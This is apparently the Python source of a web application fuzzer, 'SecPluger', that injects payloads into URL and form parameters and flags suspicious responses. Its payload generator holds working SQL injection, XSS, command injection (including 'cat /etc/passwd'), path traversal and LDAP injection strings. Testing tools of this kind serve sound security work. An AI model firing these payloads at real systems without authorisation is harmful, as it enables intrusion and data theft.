"""
SecPluger Web Fuzzer
Fuzzes web application parameters to find vulnerabilities
Similar to Burp Intruder
"""

import requests
from typing import List, Dict, Optional, Set
from urllib.parse import urlencode, urlparse, parse_qs
import logging
from pathlib import Path
import json
from datetime import datetime
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

# Import fuzzing payloads
try:
    from py3webfuzz import payloads
    PAYLOADS_AVAILABLE = True
except ImportError:
    PAYLOADS_AVAILABLE = False
    payloads = None

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class WebFuzzer:
    """
    Web application fuzzer for parameter testing
    Similar to Burp Intruder but in Python
    """

    def __init__(self, timeout: int = 10, threads: int = 5):
        self.timeout = timeout
        self.threads = threads
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'SecPluger/2.0 (Security Scanner)'
        })
        self.results: List[Dict] = []

    def fuzz_parameter(
        self,
        url: str,
        param_name: str,
        payloads: List[str],
        method: str = 'GET',
        evidence_dir: Optional[Path] = None
    ) -> Dict:
        """
        Fuzz a single parameter with multiple payloads

        Args:
            url: Target URL
            param_name: Parameter name to fuzz
            payloads: List of payloads to test
            method: HTTP method (GET/POST)
            evidence_dir: Directory to save results

        Returns:
            Dict with fuzzing results
        """
        logger.info(f"Fuzzing parameter '{param_name}' on {url}")
        logger.info(f"Testing {len(payloads)} payloads using {method}")

        results = {
            'url': url,
            'parameter': param_name,
            'method': method,
            'timestamp': datetime.now().isoformat(),
            'payloads_tested': 0,
            'vulnerabilities': [],
            'interesting_responses': [],
            'tests': []
        }

        # Fuzz with each payload
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []

            for payload in payloads:
                future = executor.submit(
                    self._test_payload,
                    url, param_name, payload, method
                )
                futures.append(future)

            # Collect results
            for future in as_completed(futures):
                test_result = future.result()
                if test_result:
                    results['tests'].append(test_result)
                    results['payloads_tested'] += 1

                    # Check for vulnerabilities
                    if test_result.get('vulnerable'):
                        results['vulnerabilities'].append(test_result)
                    elif test_result.get('interesting'):
                        results['interesting_responses'].append(test_result)

        logger.info(f"Fuzzing complete: {results['payloads_tested']} payloads tested")
        logger.info(f"Vulnerabilities found: {len(results['vulnerabilities'])}")

        # Save results
        if evidence_dir:
            self._save_results(results, evidence_dir)

        return results

    def fuzz_form(
        self,
        form_data: Dict,
        payloads: List[str],
        evidence_dir: Optional[Path] = None
    ) -> Dict:
        """
        Fuzz all inputs in a form

        Args:
            form_data: Form data with action, method, inputs
            payloads: List of payloads to test
            evidence_dir: Directory to save results

        Returns:
            Dict with fuzzing results
        """
        url = form_data['action']
        method = form_data['method']
        inputs = form_data['inputs']

        logger.info(f"Fuzzing form: {method} {url}")
        logger.info(f"Form has {len(inputs)} inputs")

        results = {
            'url': url,
            'method': method,
            'timestamp': datetime.now().isoformat(),
            'inputs_fuzzed': 0,
            'total_tests': 0,
            'vulnerabilities': [],
            'input_results': []
        }

        # Fuzz each input
        for input_field in inputs:
            if not input_field.get('name'):
                continue

            input_name = input_field['name']
            logger.info(f"Fuzzing input: {input_name}")

            # Fuzz this input
            fuzz_result = self.fuzz_parameter(
                url, input_name, payloads, method, None
            )

            results['input_results'].append(fuzz_result)
            results['inputs_fuzzed'] += 1
            results['total_tests'] += fuzz_result['payloads_tested']
            results['vulnerabilities'].extend(fuzz_result['vulnerabilities'])

        logger.info(f"Form fuzzing complete: {results['inputs_fuzzed']} inputs, "
                   f"{results['total_tests']} total tests")

        # Save results
        if evidence_dir:
            self._save_results(results, evidence_dir)

        return results

    def _test_payload(
        self,
        url: str,
        param_name: str,
        payload: str,
        method: str
    ) -> Optional[Dict]:
        """
        Test a single payload

        Args:
            url: Target URL
            param_name: Parameter name
            payload: Payload to test
            method: HTTP method

        Returns:
            Dict with test result or None on error
        """
        try:
            start_time = time.time()

            if method.upper() == 'GET':
                # Build URL with payload
                params = {param_name: payload}
                response = self.session.get(url, params=params, timeout=self.timeout)
            else:  # POST
                # Send as form data
                data = {param_name: payload}
                response = self.session.post(url, data=data, timeout=self.timeout)

            duration = time.time() - start_time

            # Analyze response
            result = {
                'payload': payload,
                'status_code': response.status_code,
                'response_length': len(response.content),
                'duration': round(duration, 3),
                'vulnerable': False,
                'interesting': False,
                'vulnerability_type': None,
                'evidence': None
            }

            # Check for vulnerabilities
            self._detect_vulnerability(result, response, payload)

            return result

        except requests.RequestException as e:
            logger.warning(f"Request failed for payload '{payload[:50]}': {e}")
            return None
        except Exception as e:
            logger.error(f"Unexpected error testing payload: {e}")
            return None

    def _detect_vulnerability(self, result: Dict, response: requests.Response, payload: str):
        """
        Detect vulnerabilities in response

        Args:
            result: Result dict to update
            response: HTTP response
            payload: Tested payload
        """
        response_text = response.text.lower()

        # SQL Injection detection
        if self._check_sqli(response_text, payload):
            result['vulnerable'] = True
            result['vulnerability_type'] = 'SQL Injection'
            result['evidence'] = 'SQL error messages in response'

        # XSS detection
        elif self._check_xss(response_text, payload):
            result['vulnerable'] = True
            result['vulnerability_type'] = 'Cross-Site Scripting (XSS)'
            result['evidence'] = 'Payload reflected in response'

        # Command Injection detection
        elif self._check_command_injection(response_text, payload):
            result['vulnerable'] = True
            result['vulnerability_type'] = 'Command Injection'
            result['evidence'] = 'Command output detected in response'

        # Path Traversal detection
        elif self._check_path_traversal(response_text, payload):
            result['vulnerable'] = True
            result['vulnerability_type'] = 'Path Traversal'
            result['evidence'] = 'File contents or path disclosure'

        # LDAP Injection detection
        elif self._check_ldap_injection(response_text, payload):
            result['vulnerable'] = True
            result['vulnerability_type'] = 'LDAP Injection'
            result['evidence'] = 'LDAP error messages'

        # Server errors (interesting responses)
        elif response.status_code >= 500:
            result['interesting'] = True
            result['evidence'] = f'Server error: {response.status_code}'

        # Unusual response sizes
        elif len(response.content) > 100000:
            result['interesting'] = True
            result['evidence'] = f'Large response: {len(response.content)} bytes'

    def _check_sqli(self, response_text: str, payload: str) -> bool:
        """Check for SQL injection"""
        sql_errors = [
            'sql syntax', 'mysql', 'sqlite', 'postgresql', 'oracle',
            'sqlexception', 'odbc', 'jdbc', 'unclosed quotation',
            'syntax error', 'quoted string not properly terminated',
            'microsoft ole db', 'warning: mysql', 'pg_query()'
        ]
        return any(error in response_text for error in sql_errors)

    def _check_xss(self, response_text: str, payload: str) -> bool:
        """Check for XSS"""
        # Check if payload is reflected
        if '<script' in payload.lower():
            return '<script' in response_text
        if 'alert(' in payload.lower():
            return 'alert(' in response_text
        if 'onerror=' in payload.lower():
            return 'onerror=' in response_text
        return False

    def _check_command_injection(self, response_text: str, payload: str) -> bool:
        """Check for command injection"""
        # Look for common command outputs
        indicators = [
            'root:', 'bin/bash', 'uid=', 'gid=',
            'windows\\system32', 'volume serial number'
        ]
        return any(indicator in response_text for indicator in indicators)

    def _check_path_traversal(self, response_text: str, payload: str) -> bool:
        """Check for path traversal"""
        indicators = [
            'root:x:', '[boot loader]', '[fonts]',
            'for 16-bit app support', 'system32'
        ]
        return any(indicator in response_text for indicator in indicators)

    def _check_ldap_injection(self, response_text: str, payload: str) -> bool:
        """Check for LDAP injection"""
        indicators = ['ldap', 'javax.naming']
        return any(indicator in response_text for indicator in indicators)

    def _save_results(self, results: Dict, evidence_dir: Path):
        """Save fuzzing results"""
        evidence_dir.mkdir(parents=True, exist_ok=True)

        # Generate filename
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        param_name = results.get('parameter', 'form')
        filename = f"fuzz_{param_name}_{timestamp}.json"

        results_file = evidence_dir / filename
        with open(results_file, 'w') as f:
            json.dump(results, f, indent=2)

        logger.info(f"Fuzzing results saved to {results_file}")


# Payload generators
class PayloadGenerator:
    """
    Generate common attack payloads for fuzzing
    """

    @staticmethod
    def get_sqli_payloads() -> List[str]:
        """Get SQL injection payloads"""
        if PAYLOADS_AVAILABLE:
            return list(payloads.get_payload('sqli'))[:50]  # Limit to 50
        else:
            return [
                "' OR '1'='1",
                "' OR '1'='1' --",
                "' OR '1'='1' /*",
                "admin' --",
                "admin' #",
                "' UNION SELECT NULL--",
                "1' AND '1'='1",
                "1' AND '1'='2",
                "' OR 1=1--",
                "\" OR \"1\"=\"1",
            ]

    @staticmethod
    def get_xss_payloads() -> List[str]:
        """Get XSS payloads"""
        if PAYLOADS_AVAILABLE:
            return list(payloads.get_payload('xss'))[:50]
        else:
            return [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg/onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<select onfocus=alert('XSS') autofocus>",
                "<textarea onfocus=alert('XSS') autofocus>",
                "<keygen onfocus=alert('XSS') autofocus>",
            ]

    @staticmethod
    def get_command_injection_payloads() -> List[str]:
        """Get command injection payloads"""
        return [
            "; ls",
            "| ls",
            "`ls`",
            "$(ls)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "; whoami",
            "| whoami",
            "& dir",
            "| dir",
        ]

    @staticmethod
    def get_path_traversal_payloads() -> List[str]:
        """Get path traversal payloads"""
        return [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%5c..%5c..%5cwindows%5cwin.ini",
            "/etc/passwd",
            "C:\\windows\\win.ini",
            "file:///etc/passwd",
        ]

    @staticmethod
    def get_ldap_injection_payloads() -> List[str]:
        """Get LDAP injection payloads"""
        return [
            "*",
            "*)(&",
            "*)(uid=*",
            "admin)(&(password=*",
            "*)(|(objectclass=*))",
        ]

    @staticmethod
    def get_all_payloads() -> List[str]:
        """Get all payloads"""
        all_payloads = []
        all_payloads.extend(PayloadGenerator.get_sqli_payloads())
        all_payloads.extend(PayloadGenerator.get_xss_payloads())
        all_payloads.extend(PayloadGenerator.get_command_injection_payloads())
        all_payloads.extend(PayloadGenerator.get_path_traversal_payloads())
        all_payloads.extend(PayloadGenerator.get_ldap_injection_payloads())
        return all_payloads


if __name__ == "__main__":
    # Test fuzzer
    fuzzer = WebFuzzer()
    gen = PayloadGenerator()

    print("=== Testing Web Fuzzer ===\n")
    print("Enter a URL with parameter to fuzz:")
    print("Example: http://testphp.vulnweb.com/listproducts.php?cat=1")
    print("(Press Ctrl+C to skip test)\n")

    try:
        test_url = input("URL: ").strip()
        if test_url and '=' in test_url:
            # Parse URL
            from urllib.parse import urlparse, parse_qs
            parsed = urlparse(test_url)
            params = parse_qs(parsed.query)

            if params:
                param_name = list(params.keys())[0]
                base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

                print(f"\nFuzzing parameter: {param_name}")
                print(f"Using SQLi payloads...\n")

                # Test with SQLi payloads
                payloads = gen.get_sqli_payloads()[:10]  # Only 10 for quick test
                results = fuzzer.fuzz_parameter(base_url, param_name, payloads)

                print(f"\n=== Results ===")
                print(f"Payloads tested: {results['payloads_tested']}")
                print(f"Vulnerabilities: {len(results['vulnerabilities'])}")

                if results['vulnerabilities']:
                    print(f"\n⚠️ Vulnerabilities found:")
                    for vuln in results['vulnerabilities'][:3]:
                        print(f"  • {vuln['vulnerability_type']}")
                        print(f"    Payload: {vuln['payload'][:50]}")
    except KeyboardInterrupt:
        print("\nTest skipped")
    except Exception as e:
        print(f"\nTest error: {e}")
